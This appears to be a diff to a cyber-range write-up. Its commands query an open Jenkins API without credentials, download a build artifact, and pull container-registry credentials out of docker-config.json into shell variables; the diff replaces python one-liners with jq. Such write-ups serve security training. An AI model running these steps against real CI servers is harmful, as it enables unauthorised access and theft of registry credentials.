@@ -45,7 +45,7 @@ This targeted scan confirmed SSH and the five range service ports open on `203.0
 
 ```bash
 # Test anonymous API access — no credentials sent
-curl --max-time 8 -fsS http://203.0.3.36:8080/api/json | python3 -m json.tool | head -20
+curl --max-time 8 -fsS http://203.0.3.36:8080/api/json | jq '{useSecurity, jobs}'
 ```
 
 
@@ -59,7 +59,7 @@ The response reports `useSecurity: false`; the unauthenticated HTTP 200 confirms
 ```bash
 # List all build jobs with artefact details
 curl --globoff --max-time 8 -fsS "http://203.0.3.36:8080/api/json?tree=jobs[name,url,lastBuild[result,artifacts[*]]]" \
-     | python3 -m json.tool
+     | jq .
 ```
 
 `--globoff` is required because curl otherwise treats the square brackets in the `tree=` query as URL glob syntax.
@@ -78,7 +78,7 @@ export RANGE3_DIR="$(mktemp -d /tmp/range3.XXXXXX)"
 chmod 700 "$RANGE3_DIR"
 curl --max-time 8 -fsS "http://203.0.3.36:8080/job/pul-firmware-build/lastSuccessfulBuild/artifact/deploy-bundle/docker-config.json" \
      -o "$RANGE3_DIR/docker-config.json"
-python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); print("registry endpoint:", next(iter(d["auths"]))); print("credential present:", bool(next(iter(d["auths"].values())).get("password")))' "$RANGE3_DIR/docker-config.json"
+jq -r '(.auths | to_entries[0]) | "registry endpoint: \(.key)\ncredential present: \(.value.password != null)"' "$RANGE3_DIR/docker-config.json"
 ```
 
 Output:
@@ -109,11 +109,14 @@ The artifact contains the literal endpoint placeholder `11.x.x.x:5000`. In this 
 
 ```bash
 # Check whether the embedded base64 auth field matches the separate password field
-python3 -c 'import base64,json,sys; x=next(iter(json.load(open(sys.argv[1]))["auths"].values())); u,p=base64.b64decode(x["auth"]).decode().split(":",1); print("auth username matches:",u==x["username"]); print("auth password matches password field:",p==x["password"])' "$RANGE3_DIR/docker-config.json"
+REGISTRY_USER="$(jq -r '.auths[] | .username' "$RANGE3_DIR/docker-config.json")"
+REGISTRY_PASSWORD_CANDIDATE="$(jq -r '.auths[] | .password' "$RANGE3_DIR/docker-config.json")"
+AUTH_VALUE="$(jq -r '.auths[] | .auth' "$RANGE3_DIR/docker-config.json" | base64 -d)"
+if test "$AUTH_VALUE" = "$REGISTRY_USER:$REGISTRY_PASSWORD_CANDIDATE"; then echo 'auth field matches password field'; else echo 'auth field does not match password field'; fi
+unset AUTH_VALUE
 
 # Load the artifact fields into this shell without printing them; the password candidate is not independently validated
-export REGISTRY_USER="$(python3 -c 'import json,sys; print(next(iter(json.load(open(sys.argv[1]))["auths"].values()))["username"])' "$RANGE3_DIR/docker-config.json")"
-export REGISTRY_PASSWORD_CANDIDATE="$(python3 -c 'import json,sys; print(next(iter(json.load(open(sys.argv[1]))["auths"].values()))["password"])' "$RANGE3_DIR/docker-config.json")"
+export REGISTRY_USER REGISTRY_PASSWORD_CANDIDATE
 printf 'Registry credential loaded for %s\n' "$REGISTRY_USER"
 ```
 
